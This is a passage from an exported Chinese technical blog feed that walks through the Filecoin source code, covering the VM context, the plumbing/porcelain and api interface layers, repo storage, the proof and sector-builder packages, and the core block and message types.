sendDeps, vmCtx *Context) : [][]byte, uint8, error vm环境实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354▼+Context : struct [fields] -ancestors : []types.TipSet -blockHeight : *types.BlockHeight -deps : *deps -from : *actor.Actor -gasTracker : *GasTracker -lookBack : int -message : *types.Message -state : *state.CachedTree -storageMap : StorageMap -to : *actor.Actor [methods] // 实现上述VMContext 接口，注释见上 +AddressForNewActor() : address.Address, error +BlockHeight() : *types.BlockHeight +Charge(cost types.GasUnits) : error +CreateNewActor(addr address.Address, code cid.Cid, initializerData interface&#123;&#125;) : error +GasUnits() : types.GasUnits +IsFromAccountActor() : bool +Message() : *types.Message +Rand(sampleHeight *types.BlockHeight) : []byte, error +ReadStorage() : []byte, error +Send(to address.Address, method string, value *types.AttoFIL, params []interface&#123;&#125;) : [][]byte, uint8, error +Storage() : exec.Storage +WriteStorage(memory interface&#123;&#125;) : error [functions] +NewVMContext(params NewContextParams) : *Context▼+NewContextParams : struct [fields] +Ancestors : []types.TipSet +BlockHeight : *types.BlockHeight +From : *actor.Actor +GasTracker : *GasTracker +LookBack : int +Message : *types.Message +State : *state.CachedTree +StorageMap : StorageMap +To : *actor.Actor▼-deps : struct [fields] +EncodeValues : func([]*abi.Value) []byte, error +GetOrCreateActor : func(context.Context, address.Address, func() *actor.Actor, error) *actor.Actor, error +Send : func(context.Context, *Context) [][]byte, uint8, error +ToValues : func([]interface&#123;&#125;) []*abi.Value, error▼ deps* : ctype [functions] -makeDeps(st *state.CachedTree) : *deps▼ functions -computeActorAddress(creator address.Address, nonce uint64) : address.Address, error 合约状态存储 12345678910111213141516171819202122232425262728293031▼+Storage : struct [fields] -actor : *actor.Actor -blockstore : blockstore.Blockstore -chunks : map[cid.Cid]ipld.Node [methods] +Commit(newCid cid.Cid, oldCid cid.Cid) : error +Flush() : error +Get(cid cid.Cid) : []byte, error +Head() : cid.Cid +Prune() : error +Put(v interface&#123;&#125;) : cid.Cid, error -liveDescendantIds(id cid.Cid) : *cid.Set, error [functions] +NewStorage(bs blockstore.Blockstore, act *actor.Actor) : Storage▼-storageMap : struct [fields] -blockstore : blockstore.Blockstore -storageMap : map[address.Address]Storage [methods] +Flush() : error +NewStorage(addr address.Address, actor *actor.Actor) : Storage▼+StorageMap : interface [methods] +Flush() : error +NewStorage(addr address.Address, actor *actor.Actor) : Storage▼ functions +NewStorageMap(bs blockstore.Blockstore) : StorageMap state包(actor状态) 表征actor的状态 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析之十二：filecoin源码分析之内部接口层plumbing＆porcelain接口]]></title>
    <url>%2F2019%2F03%2F07%2Ffilecoin-code-analysis-12%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第十二章源码分析之内部接口层plumbing＆porcelain接口。 说明 目前官方正在将api包解耦，往plumbing、porcelain中迁移 缘由: 原来的api包，依赖于node包，而node包应该属于api之上的，这导致代码耦合性大 node作为一个上帝对象，被api包依赖，对架构扩展性，其他类型节点扩展开发不利 就在笔者写这篇文章的同时，官方应该还在继续迁移，后面api包会逐步都迁移完 porcelain主要依赖于plumbing接口 上一章所述的api包将会被废除 plumbing＆porcelain模式简述 该模式是借鉴git的思路，提供两种接口，porcelain偏高层面对用户更加友好方便；plumbing偏底层，友好度弱于porcelain porcelain是英文瓷器的意思,类似洗手盆之类；plumbing是水管装置的意思，类似下水管,用户当然直接用洗手盆省心，不用管水管的事情 用户级更偏向用porcelain，协议级更偏向使用plumbing， plumbing底层接口 说明 plumbing底层接口是为实现协议以及面向网络的必须最小实现 更应用级别的调用更多将会调用到porcelain高层接口 提供的具体功能接口 区块状态读取 配置信息 日志 消息池操作 消息预览，Gas计算 消息查询 消息发送 消息等待 网络操作 Chain状态获取（actor信息） 钱包底层操作 具体的方法如下 12345678910111213141516171819202122232425262728293031323334353637383940414243▼ package plumbing▶ imports▼+API : struct [fields] -chain : chain.ReadStore -config : *cfg.Config -logger : logging.EventLogger -msgPool : *core.MessagePool -msgPreviewer : *msg.Previewer -msgQueryer : *msg.Queryer -msgSender : *msg.Sender -msgWaiter : *msg.Waiter -network : *ntwk.Network -sigGetter : *mthdsig.Getter -wallet : *wallet.Wallet [methods] +ActorGet(ctx context.Context, addr address.Address) : *actor.Actor, error +ActorGetSignature(ctx context.Context, actorAddr address.Address, method string) : *exec.FunctionSignature, error +BlockGet(ctx context.Context, id cid.Cid) : *types.Block, error +ChainHead(ctx context.Context) : types.TipSet +ChainLs(ctx context.Context) : chan interface&#123;&#125; +ConfigGet(dottedPath string) : interface&#123;&#125;, error +ConfigSet(dottedPath string, paramJSON string) : error +MessagePoolGet(cid cid.Cid) : *types.SignedMessage, bool +MessagePoolPending() : []*types.SignedMessage +MessagePoolRemove(cid cid.Cid) +MessagePreview(ctx context.Context, from, to address.Address, method string, params ...interface&#123;&#125;) : types.GasUnits, error +MessageQuery(ctx context.Context, optFrom, to address.Address, method string, params ...interface&#123;&#125;) : [][]byte, *exec.FunctionSignature, error +MessageSend(ctx context.Context, from, to address.Address, value *types.AttoFIL, gasPrice types.AttoFIL, gasLimit types.GasUnits, method string, params ...interface&#123;&#125;) : cid.Cid, error +MessageWait(ctx context.Context, msgCid cid.Cid, cb func(*types.Block, *types.SignedMessage, *types.MessageReceipt) error) : error +NetworkFindProvidersAsync(ctx context.Context, key cid.Cid, count int) : chan pstore.PeerInfo +NetworkGetPeerID() : peer.ID +PubSubPublish(topic string, data []byte) : error +PubSubSubscribe(topic string) : pubsub.Subscription, error +SignBytes(data []byte, addr address.Address) : types.Signature, error +WalletAddresses() : []address.Address +WalletFind(address address.Address) : wallet.Backend, error +WalletNewAddress() : address.Address, error [functions] +New(deps *APIDeps) : *API porcelain高层接口 说明 porcelain主要依赖plumbing实现。 主要是面向用户级操作 提供功能 获取区块高度 建立支付通道/多支付通道 获取默认地址 消息池等待未被打包进区块的消息 采用默认地址发送消息 获取指定矿工报价单 获取矿工Owner地址 获取矿工节点ID 创建矿工，预览Gas消耗 矿工报价，预览Gas消耗 矿工报价 获取签名支付凭证 钱包余额查询 12345678910111213141516171819202122232425▼ package porcelain▶ imports▼+API : struct [embedded] +*plumbing.API : *plumbing.API [methods] +ChainBlockHeight(ctx context.Context) : *types.BlockHeight, error +CreatePayments(ctx context.Context, config CreatePaymentsParams) : *CreatePaymentsReturn, error +GetAndMaybeSetDefaultSenderAddress() : address.Address, error +MessagePoolWait(ctx context.Context, messageCount uint) : []*types.SignedMessage, error +MessageSendWithDefaultAddress(ctx context.Context, from, to address.Address, value *types.AttoFIL, gasPrice types.AttoFIL, gasLimit types.GasUnits, method string, params ...interface&#123;&#125;) : cid.Cid, error +MinerGetAsk(ctx context.Context, minerAddr address.Address, askID uint64) : minerActor.Ask, error +MinerGetOwnerAddress(ctx context.Context, minerAddr address.Address) : address.Address, error +MinerGetPeerID(ctx context.Context, minerAddr address.Address) : peer.ID, error +MinerPreviewCreate(ctx context.Context, fromAddr address.Address, pledge uint64, pid peer.ID, collateral *types.AttoFIL) : types.GasUnits, error +MinerPreviewSetPrice(ctx context.Context, from address.Address, miner address.Address, price *types.AttoFIL, expiry *big.Int) : types.GasUnits, error +MinerSetPrice(ctx context.Context, from address.Address, miner address.Address, gasPrice types.AttoFIL, gasLimit types.GasUnits, price *types.AttoFIL, expiry *big.Int) : MinerSetPriceResponse, error +PaymentChannelLs(ctx context.Context, fromAddr address.Address, payerAddr address.Address) : map[string]*paymentbroker.PaymentChannel, error +PaymentChannelVoucher(ctx context.Context, fromAddr address.Address, channel *types.ChannelID, amount *types.AttoFIL, validAt *types.BlockHeight) : *paymentbroker.PaymentVoucher, error +WalletBalance(ctx context.Context, address address.Address) : *types.AttoFIL, error [functions] +New(plumbing *plumbing.API) : *API 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析十一：filecoin源码分析之内部接口层api包分析]]></title>
    <url>%2F2019%2F03%2F07%2Ffilecoin-code-analysis-11%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第十一章源码分析之内部接口层api包分析。 api包提供内部接口,供协议层、command/REST使用 较大程度依赖node包 apiapi的接口定义 如下所示，包含了一系列子接口 12345678910111213141516type API interface &#123; Actor() Actor Address() Address Client() Client Daemon() Daemon Dag() Dag ID() ID Log() Log Miner() Miner Mining() Mining Paych() Paych Ping() Ping RetrievalClient() RetrievalClient Swarm() Swarm Version() Version&#125; api的接口实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263▼ package impl▶ imports// nodeAPI来实现其接口定义▼-nodeAPI : struct [fields] // 合约 -actor : *nodeActor // 地址 -address : *nodeAddress // 客户端 -client : *nodeClient // daemon -daemon : *nodeDaemon // dag -dag : *nodeDag // 节点ID -id : *nodeID // 日志 -log : *nodeLog // 日志 -logger : logging.EventLogger // 矿工 -miner : *nodeMiner // 挖矿 -mining : *nodeMining // 节点 -node : *node.Node // 支付通道 -paych : *nodePaych // ping -ping : *nodePing // 检索客户端 -retrievalClient : *nodeRetrievalClient // swarm -swarm : *nodeSwarm // 版本 -version : *nodeVersion [methods] // 如下为实现API接口 +Actor() : api.Actor +Address() : api.Address +Client() : api.Client +Daemon() : api.Daemon +Dag() : api.Dag +ID() : api.ID +Log() : api.Log +Miner() : api.Miner +Mining() : api.Mining +Paych() : api.Paych +Ping() : api.Ping +RetrievalClient() : api.RetrievalClient +Swarm() : api.Swarm +Version() : api.Version▼ functions // 实例化API // 1 获取高层API porcelainAPI 指针,miner与paych有用到 // 2 调用各子系统的实例化函数逐一实例化 +New(node *node.Node) : api.API actoractor的接口定义123456789101112131415161718192021222324252627282930313233343536▼ package api▶ imports▼+ActorView : struct [fields] // actor类型 +ActorType : string // actor地址 +Address : string // actor余额 +Balance : *types.AttoFIL // actor代码-CID +Code : cid.Cid // 导出符号集合 +Exports : ReadableExports // 表征actor实例的状态 +Head : cid.Cid // 消息计数器，仅为account actors与外部发生交互的时候计算 +Nonce : uint64 // 导出符号集合 +ReadableExports : map[string]*ReadableFunctionSignature▼+ReadableFunctionSignature : struct [fields] // 参数 +Params : []string // 返回 +Return : []string▼+Actor : interface // 目前接口只有查看功能,返回合约的具体信息 [methods] +Ls(ctx context.Context) : []*ActorView, error actor的接口实现1234567891011121314151617181920212223242526272829▼ package impl▶ imports// 使用nodeActor来实现Actor接口▼-nodeActor : struct [fields] -api : *nodeAPI [methods] // 调用ls方法实现查询功能 +Ls(ctx context.Context) : []*api.ActorView, error [functions] // 实例化nodeActor，由api实现代码中调用 -newNodeActor(api *nodeAPI) : *nodeActor▼ functions // 获取合约类型 // 1 account actor // 2 存储市场actor // 3 支付通道actor // 4 矿工actor // 4 BootstrapMiner actor -getActorType(actType exec.ExecutableActor) : string // 查询合约状态 -ls(ctx context.Context, fcn *node.Node, actorGetter state.GetAllActorsFunc) : []*api.ActorView, error -makeActorView(act *actor.Actor, addr string, actType exec.ExecutableActor) : *api.ActorView -makeReadable(f *exec.FunctionSignature) : *api.ReadableFunctionSignature -presentExports(e exec.Exports) : api.ReadableExports address 提供功能 地址显示方法 地址查找方法 创建地址方法 导出地址方法 导入地址方法 12345678910111213141516▼ package api▶ imports▼+Address : interface [methods] +Addrs() : Addrs +Export(ctx context.Context, addrs []address.Address) : []*types.KeyInfo, error +Import(ctx context.Context, f files.File) : []address.Address, error▼+Addrs : interface [methods] +Lookup(ctx context.Context, addr address.Address) : peer.ID, error +Ls(ctx context.Context) : []address.Address, error +New(ctx context.Context) : address.Address, error client 提供如下功能 查询piece数据（DAG格式） 导入数据（相当于ipfs add） 列出所有订单 支付 发起存储交易 查询存储交易 12345678910111213141516▼+Ask : struct [fields] +Error : error +Expiry : *types.BlockHeight +ID : uint64 +Miner : address.Address +Price : *types.AttoFIL▼+Client : interface [methods] +Cat(ctx context.Context, c cid.Cid) : uio.DagReader, error +ImportData(ctx context.Context, data io.Reader) : ipld.Node, error +ListAsks(ctx context.Context) : chan Ask, error +Payments(ctx context.Context, dealCid cid.Cid) : []*paymentbroker.PaymentVoucher, error +ProposeStorageDeal(ctx context.Context, data cid.Cid, miner address.Address, ask uint64, duration uint64, allowDuplicates bool) : *storage.DealResponse, error +QueryStorageDeal(ctx context.Context, prop cid.Cid) : *storage.DealResponse, error config 提供功能 Get配置 Set配置 daemon 提供功能 启动进程相关 具体的业务启动逻辑会调用到node包 1234567891011121314151617181920212223242526272829▼ package api▶ imports▼+DaemonInitConfig : struct [fields] // 如果配置，定期检查并密封staged扇区 +AutoSealIntervalSeconds : uint +DefaultAddress : address.Address // 指定网络 +DevnetNightly : bool +DevnetTest : bool +DevnetUser : bool // 创世文件 +GenesisFile : string +PeerKeyFile : string // repo目录 +RepoDir : string // 指定矿工 +WithMiner : address.Address +DaemonInitOpt : func(*DaemonInitConfig)▼+Daemon : interface [methods] +Init(ctx context.Context, opts ...DaemonInitOpt) : error +Start(ctx context.Context) : error +Stop(ctx context.Context) : error dag 提供功能 dag查询功能 类似ipfs block get id 提供功能 ID详细信息 如多地址、协议版本、导出公钥等 1234567891011121314151617▼+IDDetails : struct [fields] +Addresses : []ma.Multiaddr +AgentVersion : string +ID : peer.ID +ProtocolVersion : string +PublicKey : []byte [methods] +MarshalJSON() : []byte, error +UnmarshalJSON(data []byte) : error▼+ID : interface [methods] +Details() : *IDDetails, error▼ functions -decode(idd map[string]*json.RawMessage, key string, dest interface&#123;&#125;) : error log 提供日志功能 123▼+Log : interface [methods] +Tail(ctx context.Context) : io.Reader miner 创建矿工 123▼+Miner : interface [methods] +Create(ctx context.Context, fromAddr address.Address, gasPrice types.AttoFIL, gasLimit types.GasUnits, pledge uint64, pid peer.ID, collateral *types.AttoFIL) : address.Address, error mining 挖矿控制 启动 停止 12345▼+Mining : interface [methods] +Once(ctx context.Context) : *types.Block, error +Start(ctx context.Context) : error +Stop(ctx context.Context) : error ping 提供ping接口 123456789▼+PingResult : struct [fields] +Success : bool +Text : string +Time : time.Duration▼+Ping : interface [methods] +Ping(ctx context.Context, pid peer.ID, count uint, delay time.Duration) : chan *PingResult, error retrieval_client 提供检索接口 123▼+RetrievalClient : interface [methods] +RetrievePiece(ctx context.Context, pieceCID cid.Cid, minerAddr address.Address) : io.ReadCloser, error swarm 提供节点连接功能 显示连接节点 连接节点 查找节点 12345678910111213141516171819202122232425262728293031323334▼+SwarmConnInfo : struct [fields] +Addr : string +Latency : string +Muxer : string +Peer : string +Streams : []SwarmStreamInfo [methods] +Len() : int +Less(i, j int) : bool +Swap(i, j int)▼+SwarmConnInfos : struct [fields] +Peers : []SwarmConnInfo [methods] +Len() : int +Less(i, j int) : bool +Swap(i, j int)▼+SwarmConnectResult : struct [fields] +Peer : string +Success : bool▼+SwarmStreamInfo : struct [fields] +Protocol : string▼+Swarm : interface [methods] +Connect(ctx context.Context, addrs []string) : []SwarmConnectResult, error +FindPeer(ctx context.Context, peerID peer.ID) : peerstore.PeerInfo, error +Peers(ctx context.Context, verbose, latency, streams bool) : *SwarmConnInfos, error 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析十：filecoin源码分析之支撑包分析(2)]]></title>
    <url>%2F2019%2F03%2F07%2Ffilecoin-code-analysis-10%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第十章源码分析之支撑包分析(2)。 本章续上一章的支撑包介绍，主要为便于后面章节的源码理解 repo 提供功能 实例化fs资源或者mem资源 提供读取、设置API地址方法 提供存储已被校验区块的方法 提供阶段密封数据存储方法 提供密封完成数据存储方法 提供读取配置方法 提供通用数据存储方法 提供交易数据存储方法 提供钱包信息存储方法 提供存储密钥方法 提供快照配置存储方法 提供版本号读取方法 12345678910111213141516171819202122232425262728293031323334353637383940414243▼ package repo▶ imports▼ constants // 当前为１，可以cat ~/.filecoin/version确认 +Version : uint▼+Datastore : interface [embedded] // 包含datastore的read、write、batch +datastore.Batching // Repo接口分别由fsrepo及memrepo实现▼+Repo : interface [methods] // 读取API地址 +APIAddr() : string, error // 存储已被校验过的区块数据 +ChainDatastore() : Datastore // 关闭 +Close() : error // 读取配置，对应上一章中的config +Config() : *config.Config // 存储通用数据 +Datastore() : Datastore // 交易数据存储 +DealsDatastore() : Datastore // 存储密钥相关 +Keystore() : keystore.Keystore // 存储倒数第二个配置 +ReplaceConfig(cfg *config.Config) : error // 存储密封扇区 +SealedDir() : string // 设置API地址 +SetAPIAddr(string) : error // 存储分段密封扇区 +StagingDir() : string // 读取版本号 +Version() : uint // 存储钱包信息 +WalletDatastore() : Datastore 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091location: repo/fsrepo.go▼ package repo▼ constants // api文件 +APIFile // chain目录:chain -chainDatastorePrefix // 配置文件名称，对应上一章中的config -configFilename // 交易目录：deals -dealsDatastorePrefix // 资源目录锁文件：repo.lock -lockFile // 快照文件前缀名 snapshot -snapshotFilenamePrefix // 快照目录;配置快照 -snapshotStorePrefix // 临时配置文件名称 -tempConfigFilename // version文件名称 -versionFilename // 钱包目录名称wallet -walletDatastorePrefix▼ variables -log▼+FSRepo : struct [fields] -cfg : *config.Config -chainDs : Datastore -dealsDs : Datastore -ds : Datastore -keystore : keystore.Keystore -lk : sync.RWMutex -lockfile : io.Closer // 资源目录路径 -path : string // 资源目录版本 -version : uint -walletDs : Datastore [methods] +APIAddr() : string, error +ChainDatastore() : Datastore +Close() : error +Config() : *config.Config +Datastore() : Datastore +DealsDatastore() : Datastore +Keystore() : keystore.Keystore +ReplaceConfig(cfg *config.Config) : error +SealedDir() : string +SetAPIAddr(maddr string) : error // 快照存储 +SnapshotConfig(cfg *config.Config) : error +StagingDir() : string +Version() : uint +WalletDatastore() : Datastore -loadConfig() : error -loadFromDisk() : error -loadVersion() : uint, error -openChainDatastore() : error -openDatastore() : error -openDealsDatastore() : error -openKeystore() : error -openWalletDatastore() : error -removeAPIFile() : error -removeFile(path string) : error [functions] // 打开已被初始化过的资源目录 +OpenFSRepo(p string) : *FSRepo, error▼+NoRepoError : struct [fields] +Path : string [methods] +Error() : string▼ functions // 从文件中读取api file +APIAddrFromFile(apiFilePath string) : string, error // 初始化资源目录 +InitFSRepo(p string, cfg *config.Config) : error -checkWritable(dir string) : error -fileExists(file string) : bool -genSnapshotFileName() : string -initConfig(p string, cfg *config.Config) : error -initVersion(p string, version uint) : error -isInitialized(p string) : bool, error 1234567891011121314151617181920212223242526272829303132333435363738▼ package repo▼ imports▼+MemRepo : struct [fields] +C : *config.Config +Chain : Datastore +D : Datastore +DealsDs : Datastore +Ks : keystore.Keystore +W : Datastore -apiAddress : string -lk : sync.RWMutex -sealedDir : string -stagingDir : string -version : uint [methods] +APIAddr() : string, error +ChainDatastore() : Datastore +CleanupSectorDirs() +Close() : error +Config() : *config.Config +Datastore() : Datastore +DealsDatastore() : Datastore +Keystore() : keystore.Keystore +ReplaceConfig(cfg *config.Config) : error +SealedDir() : string +SetAPIAddr(addr string) : error +StagingDir() : string +Version() : uint +WalletDatastore() : Datastore [functions] // 实例化内存资源接口,会调用NewInMemoryRepoWithSectorDirectories +NewInMemoryRepo() : *MemRepo // 实例化内存资源接口，指定阶段密封和最终密封目录 +NewInMemoryRepoWithSectorDirectories(staging, sealedDir string) : *MemRepo proofs和sectorbuilder proofs提供功能 校验时空证明的方法 校验密封证明的方法 更细节的注释见如下代码笔者增加的注释 rustverifier实现具体的方法 1234567891011121314151617181920212223242526272829303132location: proofs/types.go▼ package proofs▼ constants // merkle根长度 +CommitmentBytesLen : uint // 时空证明挑战参数长度:32bytes +PoStChallengeSeedBytesLen : uint // 密封复制证明长度：384bytes +SealBytesLen : uint // 时空证明长度：192bytes +SnarkBytesLen : uint // 原始数据的merkle根，由PoRep输出 +CommD : []byte // 副本数据的merkle根，由PoRep输出 +CommR : []byte // 中间层的merkle根，由PoRep输出 +CommRStar : []byte // 挑战随机参数,32bytes,256bits,PoSt的输入 +PoStChallengeSeed : []byte // 时空证明输出，192bytes +PoStProof : []byte // 密封复制证明,384bytes +SealProof : []byte 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950location: proofs/interface.go▼ package proofs▼ constants +Live +Test +SectorStoreType : int // 校验时空证明校验请求▼+VerifyPoSTRequest : struct [fields] // 挑战参数 +ChallengeSeed : PoStChallengeSeed +CommRs : []CommR +Faults : []uint64 +Proof : PoStProof +StoreType : SectorStoreType▼+VerifyPoSTResponse : struct [fields] +IsValid : bool // 向特定矿工&amp;特定扇区发起密封校验请求▼+VerifySealRequest : struct [fields] // 来自于密封的返回参数 +CommD : CommD +CommR : CommR +CommRStar : CommRStar +Proof : SealProof // 矿工标识 +ProverID : [31]byte // 扇区ID +SectorID : [31]byte // 用于控制密封校验效率 +StoreType : SectorStoreType▼+VerifySealResponse : struct [fields] +IsValid : bool▼+Verifier : interface [methods] // 校验时空证明 +VerifyPoST(VerifyPoSTRequest) : VerifyPoSTResponse, error // 校验密封证明 +VerifySeal(VerifySealRequest) : VerifySealResponse, error 1234567891011121314151617181920location: proofs/rustverifier.go▼ package proofs▶ imports▼ variables -log // RustVerifier 实现VerifyPoST与VerifySeal接口▼+RustVerifier : struct [methods] +VerifyPoST(req VerifyPoSTRequest) : VerifyPoSTResponse, error +VerifySeal(req VerifySealRequest) : VerifySealResponse, error▼ functions +CSectorStoreType(cfg SectorStoreType) : *C.ConfiguredStore, error -cUint64s(src []uint64) : *C.uint64_t, C.size_t -elapsed(what string) : func() sectorbuilder 提供向unsealed扇区写入pieces的方法 提供生成时空证明的方法 提供从特定扇区读取特定pieces的方法 提供密封完成通知的方法 提供批量密封所有未完成的分段扇区 与rust-fil-proof交互，更深入的逻辑需要参见rust 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162location: proofs/sectorbuilder/interface.gopackage sectorbuilder▶ imports // 生成生成时空证明请求▼+GeneratePoSTRequest : struct [fields] +ChallengeSeed : proofs.PoStChallengeSeed +CommRs : []proofs.CommR // 生成生成时空证明响应▼+GeneratePoSTResponse : struct [fields] +Faults : []uint64 +Proof : proofs.PoStProof▼+PieceInfo : struct [fields] +Ref : cid.Cid +Size : uint64 // 密封元数据▼+SealedSectorMetadata : struct [fields] +CommD : proofs.CommD // 副本哈希后续将被删除 +CommR : proofs.CommR +CommRStar : proofs.CommRStar // Pieces后续将被删除 +Pieces : []*PieceInfo +Proof : proofs.SealProof +SectorID : uint64 // 密封结果▼+SectorSealResult : struct [fields] +SealingErr : error +SealingResult : *SealedSectorMetadata +SectorID : uint64 // SectorBuilder提供相关功能 // 1 写入、密封pieces至扇区 // 2 unseal、读取pieces▼+SectorBuilder : interface [methods] // 向unsealed扇区写入pieces +AddPiece(ctx context.Context, pi *PieceInfo) : uint64, error +Close() : error // 生成时空证明 +GeneratePoST(GeneratePoSTRequest) : GeneratePoSTResponse, error +GetMaxUserBytesPerStagedSector() : uint64, error // 从扇区中读取特定pieces +ReadPieceFromSealedSector(pieceCid cid.Cid) : io.Reader, error // 密封所有未完成的分段扇区 +SealAllStagedSectors(ctx context.Context) : error // 密封完成的通知 +SectorSealResults() : chan SectorSealResult▼ functions -init() 1234location: proofs/sectorbuilder/poller.go// 当pieces加入后，会进行FFI调用，定时执行密封const SealedSectorPollingInterval = 1 * time.Second type如下对一些主要结构进行简析 AttoFIL(10*-18 FIL) 提供AttoFIL的算数运算方法 提供AttoFIL的逻辑运算方法 Block 区块结构 1234567891011121314151617181920212223▼+Block : struct [fields] +Height : Uint64 +MessageReceipts : []*MessageReceipt +Messages : []*SignedMessage +Miner : address.Address +Nonce : Uint64 +ParentWeight : Uint64 +Parents : SortedCidSet +Proof : proofs.PoStProof +StateRoot : cid.Cid +Ticket : Signature -cachedBytes : []byte -cachedCid : cid.Cid [methods] +Cid() : cid.Cid +Equals(other *Block) : bool +IsParentOf(c Block) : bool +Score() : uint64 +String() : string +ToNode() : node.Node [functions] +DecodeBlock(b []byte) : *Block, error BlockHeight 区块高度相关操作方法 123456789101112131415161718▼+BlockHeight : struct [fields] -val : *big.Int [methods] +Add(y *BlockHeight) : *BlockHeight +AsBigInt() : *big.Int +Bytes() : []byte +Equal(y *BlockHeight) : bool +GreaterEqual(y *BlockHeight) : bool +GreaterThan(y *BlockHeight) : bool +LessEqual(y *BlockHeight) : bool +LessThan(y *BlockHeight) : bool +String() : string +Sub(y *BlockHeight) : *BlockHeight [functions] +NewBlockHeight(x uint64) : *BlockHeight +NewBlockHeightFromBytes(buf []byte) : *BlockHeight +NewBlockHeightFromString(s string, base int) : *BlockHeight, bool BytesAmount (*big.Int) 提供相关的算数逻辑运算 ChannelID(支付通道结构体) 12345678910111213▼+ChannelID : struct [fields] -val : *big.Int [methods] +Bytes() : []byte +Equal(y *ChannelID) : bool +Inc() : *ChannelID +KeyString() : string +String() : string [functions] +NewChannelID(x uint64) : *ChannelID +NewChannelIDFromBytes(buf []byte) : *ChannelID +NewChannelIDFromString(s string, base int) : *ChannelID, bool 一些变量定义 创建各类actor对象 123456789101112func init() &#123; AccountActorCodeObj = dag.NewRawNode([]byte(&quot;accountactor&quot;)) AccountActorCodeCid = AccountActorCodeObj.Cid() StorageMarketActorCodeObj = dag.NewRawNode([]byte(&quot;storagemarket&quot;)) StorageMarketActorCodeCid = StorageMarketActorCodeObj.Cid() PaymentBrokerActorCodeObj = dag.NewRawNode([]byte(&quot;paymentbroker&quot;)) PaymentBrokerActorCodeCid = PaymentBrokerActorCodeObj.Cid() MinerActorCodeObj = dag.NewRawNode([]byte(&quot;mineractor&quot;)) MinerActorCodeCid = MinerActorCodeObj.Cid() BootstrapMinerActorCodeObj = dag.NewRawNode([]byte(&quot;bootstrapmineractor&quot;)) BootstrapMinerActorCodeCid = BootstrapMinerActorCodeObj.Cid()&#125; Message相关 消息结构及方法 filecoin网络的交易由一些列的Message组成 123456789101112131415▼+Message : struct [fields] +From : address.Address +Method : string +Nonce : Uint64 +Params : []byte +To : address.Address +Value : *AttoFIL [methods] +Cid() : cid.Cid, error +Marshal() : []byte, error +String() : string +Unmarshal(b []byte) : error [functions] +NewMessage(from, to address.Address, nonce uint64, value *AttoFIL, method string, params []byte) : *Message 12345▼+MessageReceipt : struct [fields] +ExitCode : uint8 +GasAttoFIL : *AttoFIL +Return : [][]byte 1234567891011▼+MeteredMessage : struct [fields] +GasLimit : GasUnits +GasPrice : AttoFIL [embedded] +Message : Message [methods] +Marshal() : []byte, error +Unmarshal(b []byte) : error [functions] +NewMeteredMessage(msg Message, gasPrice AttoFIL, gasLimit GasUnits) : *MeteredMessage 1234567891011121314▼+SignedMessage : struct [fields] +Signature : Signature [embedded] +MeteredMessage : MeteredMessage [methods] +Cid() : cid.Cid, error +Marshal() : []byte, error +RecoverAddress(r Recoverer) : address.Address, error +String() : string +Unmarshal(b []byte) : error +VerifySignature() : bool [functions] +NewSignedMessage(msg Message, s Signer, gasPrice AttoFIL, gasLimit GasUnits) : *SignedMessage, error TipSet 区块集合 1234567891011121314 +Tip : Block▼+TipSet : map[cid.Cid]*Tip [methods] +AddBlock(b *Block) : error +Clone() : TipSet +Equals(ts2 TipSet) : bool +Height() : uint64, error +MinTicket() : Signature, error +ParentWeight() : uint64, error +Parents() : SortedCidSet, error +String() : string +ToSlice() : []*Block +ToSortedCidSet() : SortedCidSet abi abi 对filecoin中的各类数据定义数据类型 提供abi编解码操作方法 pubsub 提供功能 提供订阅实例化以及订阅方法 提供发布实例化以及发布方法 1234567891011121314151617181920212223242526272829▼ package pubsub▶ imports▼+Subscriber : struct [fields] -pubsub : *libp2p.PubSub [methods] +Subscribe(topic string) : Subscription, error [functions] +NewSubscriber(sub *libp2p.PubSub) : *Subscriber▼-subscriptionWrapper : struct [embedded] +*libp2p.Subscription : *libp2p.Subscription [methods] +Next(ctx context.Context) : Message, error▼+Message : interface [methods] +GetData() : []byte +GetFrom() : peer.ID▼+Subscription : interface [methods] +Cancel() +Next(ctx context.Context) : Message, error +Topic() : string 123456789101112▼ package pubsub▶ imports▼+Publisher : struct [fields] -pubsub : *pubsub.PubSub [methods] +Publish(topic string, data []byte) : error [functions] +NewPublisher(sub *pubsub.PubSub) : *Publisher 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[登链钱包-一款功能强大的完全开源以太坊钱包]]></title>
    <url>%2F2019%2F03%2F07%2Fwallet-annouce%2F</url>
